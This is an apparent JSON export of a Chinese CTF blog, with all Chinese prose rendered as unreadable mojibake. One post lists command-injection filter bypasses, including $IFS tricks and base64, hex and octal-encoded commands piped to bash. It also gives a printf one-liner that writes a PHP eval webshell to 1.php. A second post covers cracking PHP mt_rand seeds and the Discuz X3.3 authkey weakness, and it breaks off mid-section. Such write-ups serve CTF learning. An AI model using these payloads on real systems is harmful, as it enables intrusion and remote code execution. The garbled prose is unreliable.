textä»å‘½ä»¤è¡Œè¯»å–è¾“å…¥ï¼Œç›´åˆ°ä¸€ä¸ªä¸textç›¸åŒçš„è¡Œç»“æŸã€‚é™¤éä½¿ç”¨å¼•å·æŠŠè¾“å…¥æ‹¬èµ·æ¥ï¼Œæ­¤æ¨¡å¼å°†å¯¹è¾“å…¥å†…å®¹è¿›è¡Œshellå˜é‡æ›¿æ¢ã€‚å¦‚æœä½¿ç”¨&lt;&lt;- ï¼Œåˆ™ä¼šå¿½ç•¥æ¥ä¸‹æ¥è¾“å…¥è¡Œé¦–çš„tabï¼Œç»“æŸè¡Œä¹Ÿå¯ä»¥æ˜¯ä¸€å †tabå†åŠ ä¸Šä¸€ä¸ªä¸textç›¸åŒçš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒå¾Œé¢çš„ä¾‹å­ã€‚ cmd &lt;&lt;&lt; wordæŠŠwordï¼ˆè€Œä¸æ˜¯æ–‡ä»¶wordï¼‰å’Œåé¢çš„æ¢è¡Œä½œä¸ºè¾“å…¥æä¾›ç»™cmdã€‚ cmd &lt;&gt; fileä»¥è¯»å†™æ¨¡å¼æŠŠæ–‡ä»¶fileé‡å®šå‘åˆ°è¾“å…¥ï¼Œæ–‡ä»¶fileä¸ä¼šè¢«ç ´åã€‚ä»…å½“åº”ç”¨ç¨‹åºåˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§æ—¶ï¼Œå®ƒæ‰æ˜¯æœ‰æ„ä¹‰çš„ã€‚ cmd &gt;| fileåŠŸèƒ½åŒ&gt;ï¼Œä½†å³ä¾¿åœ¨è®¾ç½®äº†noclobberæ—¶ä¹Ÿä¼šå¤ç›–fileæ–‡ä»¶ï¼Œæ³¨æ„ç”¨çš„æ˜¯|è€Œéä¸€äº›ä¹¦ä¸­è¯´çš„!ï¼Œç›®å‰ä»…åœ¨cshä¸­ä»æ²¿ç”¨&gt;!å®ç°è¿™ä¸€åŠŸèƒ½ã€‚ : &gt; filename æŠŠæ–‡ä»¶filenameæˆªæ–­ä¸º0é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, é‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ª0é•¿åº¦çš„æ–‡ä»¶(ä¸touchçš„æ•ˆæœç›¸åŒ). cmd &gt;&amp;n æŠŠè¾“å‡ºé€åˆ°æ–‡ä»¶æè¿°ç¬¦n cmd m&gt;&amp;n æŠŠè¾“å‡ºåˆ°æ–‡ä»¶ç¬¦mçš„ä¿¡æ¯é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦n cmd &gt;&amp;- å…³é—­æ ‡å‡†è¾“å‡º cmd &lt;&amp;n è¾“å…¥æ¥è‡ªæ–‡ä»¶æè¿°ç¬¦n cmd m&lt;&amp;n mæ¥è‡ªæ–‡ä»¶æè¿°å„ä¸ªn cmd &lt;&amp;- å…³é—­æ ‡å‡†è¾“å…¥ cmd &lt;&amp;n- ç§»åŠ¨è¾“å…¥æ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚ cmd &gt;&amp;n- ç§»åŠ¨è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚æ³¨æ„ï¼š &gt;&amp;å®é™…ä¸Šå¤åˆ¶äº†æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä½¿å¾—cmd &gt; file 2&gt;&amp;1ä¸cmd 2&gt;&amp;1 &gt;fileçš„æ•ˆæœä¸ä¸€æ ·ã€‚ é€šé…ç¬¦è¿˜æœ‰ä¸€ç±»é€šé…ç¬¦ï¼Œé¦–å…ˆå…ˆäº†è§£ä¸‹ä»€ä¹ˆæ˜¯Linux shellé€šé…ç¬¦/globæ¨¡å¼: glob æ¨¡å¼ï¼ˆglobbingï¼‰ä¹Ÿè¢«ç§°ä¹‹ä¸º shell é€šé…ç¬¦ï¼Œåå­—çš„èµ·æºæ¥è‡ªäº Unix V6 ä¸­çš„ /etc/glob ï¼ˆè¯¦è§ man æ–‡æ¡£ï¼‰ã€‚glob æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¨¡å¼åŒ¹é…ï¼Œæœ€å¸¸è§çš„æ˜¯é€šé…ç¬¦æ‹“å±•ï¼Œä¹Ÿå¯ä»¥å°† glob æ¨¡å¼è®¾ä¸ºç²¾ç®€äº†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨æœ€æ–°çš„ CentOS 7 ä¸­å·²ç»åˆ é™¤äº† glob çš„ç›¸å…³æè¿°æ–‡æ¡£ï¼Œåˆ é™¤çš„åŸå› ç”±äº glob å·²ç»æ•´åˆåˆ°äº† shell ä¹‹ä¸­ï¼Œç„¶åå°±æœ‰äº† shell é€šé…ç¬¦ã€‚shell é€šé…ç¬¦ / glob æ¨¡å¼é€šå¸¸ç”¨æ¥åŒ¹é…ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬ï¼ï¼ï¼ è¯­æ³• å­—ç¬¦ è§£é‡Š * åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦ ? åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ [list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ [^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ [!list] åŒ[^list] {str1,str2,â€¦} åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ IFS ç”± &lt; space &gt; æˆ– &lt; tab &gt; æˆ– &lt; enter &gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ CR ç”± &lt; enter &gt; äº§ç”Ÿ ! æ‰§è¡Œ history ä¸­çš„å‘½ä»¤ ä»¥åŠè¿˜æœ‰ä¸“ç”¨å­—ç¬¦é›† å­—ç¬¦ æ„ä¹‰ [:alnum:] ä»»æ„æ•°å­—æˆ–è€…å­—æ¯ [:alpha:] ä»»æ„å­—æ¯ [:space:] ç©ºæ ¼ [:lower:] å°å†™å­—æ¯ [:digit:] ä»»æ„æ•°å­— [:upper:] ä»»æ„å¤§å†™å­—æ¯ [:cntrl:] æ§åˆ¶ç¬¦ [:graph:] å›¾å½¢ [:print:] å¯æ‰“å°å­—ç¬¦ [:punct:] æ ‡ç‚¹ç¬¦å· [:xdigit:] åå…­è¿›åˆ¶æ•° [:blank:] ç©ºç™½å­—ç¬¦ åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ [ ] æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚[[:space:]] æƒ³è¦è½¬ä¹‰çš„æ—¶å€™ï¼Œå•å¼•å·ä¸åŒå¼•å·ä½¿ç”¨æ–¹æ³•æ˜¯ä¸åŒçš„ï¼Œå•å¼•å·ä¼šè½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œè€Œä¸”å•å¼•å·ä¸­é—´ä¸å…è®¸å†å‡ºç°å•å¼•å·ï¼ŒåŒå¼•å·å…è®¸å‡ºç°ç‰¹å®šçš„ shell å…ƒå­—ç¬¦ï¼Œå…·ä½“å­—ç¬¦å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢ åœ¨ä½¿ç”¨èŠ±æ‹¬å· {} çš„æ—¶å€™ï¼Œé‡Œé¢çš„å•ä¸ªå­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬ä½ï¼Œå¦åˆ™å°±ä¼šè§†ä¸ºå¤šä¸ªçš„å•ä¸ªå­—ç¬¦ å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§1. ç©ºæ ¼ç»•è¿‡ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä¸²ä»£æ›¿ï¼š 1&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ $&#123;IFS&#125;ã€$IFSç­‰ $IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„cat$IFS2,bashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œç„¶è€Œå¦‚æœåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨$9å‘¢ï¼Œå› ä¸º$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚ 2.ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦12linuxä¸­ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||windowsä¸­ï¼š%0aã€&amp;ã€|ã€%1aï¼ˆä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰ 1ã€åœ¨ shell ä¸­ï¼Œæ‹…ä»»â€è¿ç»­æŒ‡ä»¤â€åŠŸèƒ½çš„ç¬¦å·å°±æ˜¯â€;â€2ã€â€&amp;â€ æ”¾åœ¨å¯åŠ¨å‚æ•°åé¢è¡¨ç¤ºè®¾ç½®æ­¤è¿›ç¨‹ä¸ºåå°è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿›ç¨‹æ˜¯å‰å°è¿›ç¨‹ï¼Œè¿™æ—¶å°±æŠŠShellç»™å æ®äº†ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œå…¶ä»–æ“ä½œï¼Œå¯¹äºé‚£äº›æ²¡æœ‰äº¤äº’çš„è¿›ç¨‹ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›å°†å…¶åœ¨åå°å¯åŠ¨ï¼Œå¯ä»¥åœ¨å¯åŠ¨å‚æ•°çš„æ—¶å€™åŠ ä¸€ä¸ªâ€™&amp;â€™å®ç°è¿™ä¸ªç›®çš„ã€‚3ã€ç®¡é“ç¬¦â€|â€å·¦è¾¹å‘½ä»¤çš„è¾“å‡ºå°±ä¼šä½œä¸ºç®¡é“ç¬¦å³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œæ‰€ä»¥å·¦è¾¹çš„è¾“å‡ºå¹¶ä¸æ˜¾ç¤º 3.èŠ±æ‹¬å·çš„åˆ«æ ·ç”¨æ³•åœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨&#123;OS_COMMAND,ARGUMENT&#125;æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 4.é»‘åå•ç»•è¿‡æ‹¼æ¥ç»•è¿‡æ¯”å¦‚ï¼ša=l;b=s;$a$bä¸Šé¢çš„ç¬¬äºŒé“é¢˜ç›®ä¹Ÿæ˜¯åˆ©ç”¨å¶è¯»æ‹¼æ¥æ–¹æ³•ç»•è¿‡é»‘åå•ï¼ša=fl;b=ag;cat $a$b ç¼–ç ç»•è¿‡base64ï¼š 12echo MTIzCg==|base64 -d å…¶å°†ä¼šæ‰“å°123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag hexï¼š 1echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag octï¼š 12345$(printf &quot;\\154\\163&quot;) ==&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) ==&gt;cat /flag&#123;printf,&quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;&#125;|\\$0 ==&gt;cat /flag#å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;$&#123;printf,&quot;\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76&quot;&#125; &gt;&gt; 1.php å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡æ¯”å¦‚ï¼šca&#39;&#39;t flag æˆ–ca&quot;&quot;t flag åæ–œæ ç»•è¿‡æ¯”å¦‚ï¼šca\\t fl\\ag åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡ å˜é‡ å«ä¹‰ $0 å½“å‰è„šæœ¬çš„æ–‡ä»¶å $n ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©º $# ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•° $$ å½“å‰shellè¿›ç¨‹ID $* ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©º $@ ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚è¢«åŒå¼•å·åŒ…å‡½æ—¶ï¼Œä¸$*ç¨æœ‰ä¸åŒ $? ä¸Šä¸ªå‘½ä»¤çš„æ¨å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼ linux shellä¸­$nè¡¨ç¤ºä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚$@è¡¨ç¤ºæ¯”å¦‚ï¼šca$@t fla$@gca$1t fla$2g 5.é•¿åº¦é™åˆ¶é•¿åº¦é™åˆ¶å¯ä»¥ç”¨æ–‡ä»¶æ„é€ çš„æ–¹å¼æ¥ç»•è¿‡ã€‚ 123linuxä¸‹å¯ä»¥ç”¨ 1&gt;aåˆ›å»ºæ–‡ä»¶åä¸ºaçš„ç©ºæ–‡ä»¶ls -t&gt;teståˆ™ä¼šå°†ç›®å½•æŒ‰æ—¶é—´æ’åºåå†™è¿›testæ–‡ä»¶ä¸­shå‘½ä»¤å¯ä»¥ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–å‘½ä»¤æ¥æ‰§è¡Œ 6.å†…è”æ‰§è¡Œå‘½ä»¤æ›¿ä»£ï¼Œå¤§éƒ¨åˆ†Unix shellä»¥åŠç¼–ç¨‹è¯­è¨€å¦‚Perlã€PHPä»¥åŠRubyç­‰éƒ½ä»¥æˆå¯¹çš„é‡éŸ³ç¬¦(åå¼•å·)ä½œæŒ‡ä»¤æ›¿ä»£ï¼Œæ„æ€æ˜¯ä»¥æŸä¸€ä¸ªæŒ‡ä»¤çš„è¾“å‡ºç»“æœä½œä¸ºå¦ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥é¡¹ã€‚ä¾‹å¦‚ï¼š 1echo &quot;a`pwd`&quot; ç±»ä¼¼çš„è¿˜æœ‰$(command).ä¾‹å¦‚ï¼š 1echo â€œabcd $(pwd)â€ 7.é€šé…ç¬¦ä¸Šé¢å·²ç»è®°è¿‡ å‚è€ƒï¼š https://blog.zeddyu.info/2019/01/17/å‘½ä»¤æ‰§è¡Œ/ https://blog.csdn.net/silence1_/article/details/96135760 https://www.freebuf.com/articles/web/137923.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"bypass","slug":"bypass","permalink":"http://www.m00nback.xyz/tags/bypass/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://www.m00nback.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"phpä¼ªéšæœºæ•°","slug":"php-fakerandom-number","date":"2019-12-30T06:43:45.000Z","updated":"2020-04-29T14:51:52.015Z","comments":true,"path":"2019/12/30/php-fakerandom-number/","link":"","permalink":"http://www.m00nback.xyz/2019/12/30/php-fakerandom-number/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpä¼ªéšæœºæ•°çš„ç›¸å…³å†…å®¹ï¼ï¼ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpä¼ªéšæœºæ•°çš„ç›¸å…³å†…å®¹ï¼ï¼ï¼ ç›¸å…³å‡½æ•°mt_rand()mt_randå‡½æ•°æœ‰ä¸¤ä¸ªå¯é€‰å‚æ•° min å’Œ maxï¼Œå¦‚æœæ²¡æœ‰æä¾›å¯é€‰å‚æ•°ï¼Œmt_randå‡½æ•°å°†è¿”å›è¿”å› 0 åˆ° mt_getrandmax() ä¹‹é—´çš„ä¼ªéšæœºæ•°ã€‚ä¾‹å¦‚æƒ³è¦ 5 åˆ° 15ï¼ˆåŒ…æ‹¬ 5 å’Œ 15ï¼‰ä¹‹é—´çš„éšæœºæ•°ï¼Œç”¨ mt_rand(5, 15)ã€‚ mt_srand()ç”¨äºæ’­ä¸‹ä¸€ä¸ªæ›´å¥½çš„éšæœºæ•°å‘ç”Ÿå™¨ç§å­ï¼Œç”¨ seed æ¥ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ã€‚ æ²¡æœ‰è®¾å®š seed å‚æ•°æ—¶ï¼Œä¼šè¢«è®¾ä¸ºéšæ—¶æ•°ã€‚è‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– mt_srand() ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ ï¼Œå› ä¸ºç°åœ¨æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ã€‚ è¿™å¼ å›¾æ„Ÿè§‰æŒºå¥½çš„ ä¸€ä¸ªé¢˜ç›®1234567891011121314151617 &lt;?php show_source(__FILE__); include &quot;flag.php&quot;; $a = @$_REQUEST[&#x27;hello&#x27;]; $seed = @$_REQUEST[&#x27;seed&#x27;]; $key = @$_REQUEST[&#x27;key&#x27;]; mt_srand($seed); $true_key = mt_rand(); if ($key == $true_key)&#123; echo &quot;Key Confirm&quot;; &#125; else&#123; die(&quot;Key Error&quot;); &#125; eval( &quot;var_dump($a);&quot;);?&gt; å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªé¢˜ç›®ä¼ äº†ä¸‰ä¸ªå‚æ•°ï¼Œseedå¯æ§ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€åœ¨phpstudyé€‰æ‹©ç›¸åŒçš„phpç‰ˆæœ¬è®¾å®šç›¸åŒçš„seedï¼Œè¾“å‡ºäº§ç”Ÿçš„éšæœºæ•°å°±è¡Œ phpç‰ˆæœ¬å·®åˆ«php5å’Œphp7ä¼šç”¨ä¸åŒçš„ç®—æ³•æ¥ç”Ÿæˆéšæœºæ•°ï¼Œæ‰€ä»¥å³ä½¿seedç›¸åŒç”Ÿæˆçš„éšæœºæ•°ä¹Ÿä¸ç›¸åŒ php_mt_seedphp_mt_seedæ˜¯ä¸€ä¸ªç ´è§£mt_randå‡½æ•°seedçš„å·¥å…·ï¼Œåœ¨æœ€ç®€å•çš„è°ƒç”¨æ¨¡å¼ä¸‹ï¼Œå®ƒèƒ½é€šè¿‡mt_randç¬¬ä¸€æ¬¡è¾“å‡ºçš„å€¼å¯»æ‰¾mt_randçš„seedï¼Œåœ¨æ›´é«˜çº§çš„æ¨¡å¼ä¸­å®ƒèƒ½åŒ¹é…ä¸æ˜¯ç¬¬ä¸€æ¬¡è¾“å‡ºçš„å’Œä¸æ˜ç¡®å…·ä½“è¾“å‡ºçš„æƒ…å†µã€‚ p_mt_seedåŸºäºå‘½ä»¤è¡Œè¿è¡Œï¼Œå‘½ä»¤è¡Œå¯ä»¥ä½¿ç”¨1ï¼Œ2ï¼Œ4æˆ–è€…æ›´å¤šçš„å‚æ•°ã€‚è¿™äº›å‚æ•°éœ€è¦è¯¦ç»†è¯´æ˜mt_rand()çš„è¾“å‡ºã€‚ 12git clone https://github.com/lepiaf/php_mt_seed.gitmake 4.0ç‰ˆæœ¬ä»è¿™é‡Œä¸‹è½½ï¼šhttps://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz ä¸€ä¸ªå‚æ•°å½“åªæœ‰ä¸€ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨mt_randç¬¬ä¸€æ¬¡è¾“å‡ºçš„å€¼ã€‚ ä¸¤ä¸ªå‚æ•°å½“æœ‰ä¸¤ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œä»–ä»¬ä»£è¡¨mt_randç¬¬ä¸€æ¬¡è¾“å‡ºåº”è¯¥ä½äºä»€ä¹ˆåŒºé—´å†…ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæœ€å°å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæœ€å¤§å€¼ã€‚ å››ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰å‰ä¸¤ä¸ªå‚æ•°è¡¨ç¤ºmt_randè¾“å‡ºçš„å€¼ï¼Œåä¸¤ä¸ªå‚æ•°è¡¨ç¤ºmt_randè¾“å‡ºçš„åŒºé—´(ä»0å¼€å§‹)ã€‚ å¤šäºäº”ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰æ¯å››ä¸ªå‚æ•°ä¸€ç»„ï¼Œä½†æ˜¯æœ€åä¸€ç»„å¯ä»¥æ˜¯1ï¼Œ2æˆ–4ä¸ªå‚æ•°ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ ¼å¼ã€‚ è¯¦ç»†ä½¿ç”¨å‚è§ï¼šhttps://www.openwall.com/php_mt_seed/README ç®€å•ä½¿ç”¨è¿™é‡Œç”¨çš„æ˜¯php7.0 å‡è®¾æœ‰è¿™æ ·ä¸€ä¸ªç”Ÿæˆéšæœºåºåˆ—çš„ç®—æ³•ï¼Œç”Ÿæˆäº†ä¸‹å›¾çš„éšæœºæ•° 12345678910111213141516&lt;?phpfunction user_password($length = 10) &#123; $allowable_characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $len = strlen($allowable_characters) - 1; $pass = &#x27;&#x27;; for ($i = 0; $i &lt; $length; $i++) &#123; $pass .= $allowable_characters[mt_rand(0, $len)]; &#125; return $pass; &#125; mt_srand(time()); echo user_password(), &quot;\\n&quot;; echo user_password(), &quot;\\n&quot;; echo user_password(), &quot;\\n&quot;; ?&gt; å†™ä¸€ä¸ªç¨‹åºæ¥è½¬æ¢ç”Ÿæˆçš„éšæœºæ•° 12345s=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;pwd=&quot;UHsI89HQVr&quot;for i in pwd: print(str(s.index(i))+&quot; &quot;+str(s.index(i))+&quot; 0 61 &quot;,end=&quot;&quot;)//ç»“æœï¼š46 46 0 61 33 33 0 61 18 18 0 61 34 34 0 61 60 60 0 61 61 61 0 61 33 33 0 61 42 42 0 61 47 47 0 61 17 17 0 61 ç„¶åæˆ‘ä»¬éªŒè¯ä¸€ä¸‹ç”¨çˆ†ç ´å‡ºæ¥çš„seedæ˜¯å¦èƒ½ç”Ÿæˆç›¸åŒçš„åºåˆ— å¯ä»¥çœ‹åˆ°æˆåŠŸå®ç° Discuz X3.3 authkeyç”Ÿæˆç®—æ³•æ¼æ´ç”¨æˆ·åœ¨åˆæ¬¡å®‰è£…è½¯ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªauthkeyå†™å…¥å…¨å±€é…ç½®æ–‡ä»¶å’Œæ•°æ®åº“ï¼Œä¹‹åå®‰è£…æ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚è¯¥authkeyç”¨äºå¯¹æ™®é€šç”¨æˆ·çš„cookieè¿›è¡ŒåŠ å¯†ç­‰å¯†ç å­¦æ“ä½œï¼Œä½†æ˜¯ç”±äºç”Ÿæˆç®—æ³•è¿‡äºç®€å•ï¼Œå¯ä»¥åˆ©ç”¨å…¬å¼€ä¿¡æ¯è¿›è¡Œæœ¬åœ°çˆ†ç ´ã€‚authkeyç”Ÿæˆç®—æ³•ä½äºDiscuz_X3.3_SC_UTF8/upload/install/index.phpä¸­ authkeyçš„ç”Ÿæˆæ–¹æ³•å¦‚ä¸‹ï¼š 1$authkey = substr(md5($_SERVER[&#x27;SERVER_ADDR&#x27;].$_SERVER[&#x27;HTTP_USER_AGENT&#x27;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 6)), 8, 6).random(10); å¯ä»¥çœ‹å‡ºauthkeyä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š MD5çš„ä¸€éƒ¨åˆ†ï¼ˆå‰6ä½ï¼‰ + randomç”Ÿæˆçš„10ä½ è·Ÿå…¥randomå‡½æ•° 12345678910function random($length) &#123; $hash = &#x27;&#x27;; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;; $max = strlen($chars) - 1; PHP_VERSION &lt; &#x27;4.2.0&#x27; &amp;&amp; mt_srand((double)microtime() * 1000000); for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125; ç”±äºå­—ç¬¦ç”Ÿæˆé›†åˆæ˜¯å›ºå®šçš„ï¼Œä¸”æ²¡æœ‰é‡å¤å­—ç¬¦ï¼Œé‚£ä¹ˆå‡½æ•°ä¸­æ¯ä¸€æ¬¡ç”Ÿæˆhashéƒ½å”¯ä¸€å¯¹åº”äº†charsæ•°ç»„ä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨åŒä¸€ä¸ªseedç”Ÿæˆçš„ã€‚ åœ¨ä¹‹åçš„ä»£ç ä¸­ä½¿ç”¨äº†åŒæ ·çš„randomå‡½æ•°ï¼š 1$_config[&#x27;cookie&#x27;][&#x27;cookiepre&#x27;] = random(4).&#x27;_&#x27;; Cookieçš„å‰å››ä¸ªå­—èŠ‚æ˜¯å·²çŸ¥çš„ï¼Œå¹¶ä¸”ä½¿ç”¨äº†åŒæ ·çš„randomå‡½æ•°ï¼Œé‚£ä¹ˆæ€è·¯å¾ˆæ˜æ˜¾ï¼š é€šè¿‡å·²çŸ¥çš„4ä½ï¼Œç®—å‡ºrandomä½¿ç”¨çš„ç§å­ï¼Œè¿›è€Œå¾—åˆ°authkeyå10ä½ã€‚é‚£å‰©ä¸‹çš„å°±éœ€è¦æå®šå‰6ä½ï¼Œæ ¹æ®å…¶ç”Ÿæˆç®—æ³•ï¼Œåªå¥½é€‰æ‹©çˆ†ç ´çš„æ–¹å¼ï¼Œç”±äºæ•°é‡å¤ªå¤§ï¼Œå°±ä¸€å®šè¦é€‰æ‹©ä¸€ä¸ªæœ¬åœ°çˆ†ç ´çš„æ–¹å¼ï¼ˆå³ä½¿ç”¨åˆ°authkeyè€Œä¸”åŠ å¯†åçš„ç»“æœæ˜¯å·²çŸ¥çš„ï¼‰ã€‚ åœ¨è°ƒç”¨authcodeå‡½æ•°å¾ˆå¤šçš„åœ°æ–¹éƒ½å¯ä»¥è¿›è¡Œæ ¡éªŒï¼Œåœ¨è¿™é‡Œä½¿ç”¨æ‰¾å›å¯†ç é“¾æ¥ä¸­çš„idå’Œsignå‚æ•°ï¼š signç”Ÿæˆçš„æ–¹æ³•å¦‚ä¸‹ï¼š 123function dsign($str, $length = 16)&#123; return substr(md5($str.getglobal(&#x27;config/security/authkey&#x27;)), 0, ($length ? max(8, $length) : 16));&#125; çˆ†ç ´authkey 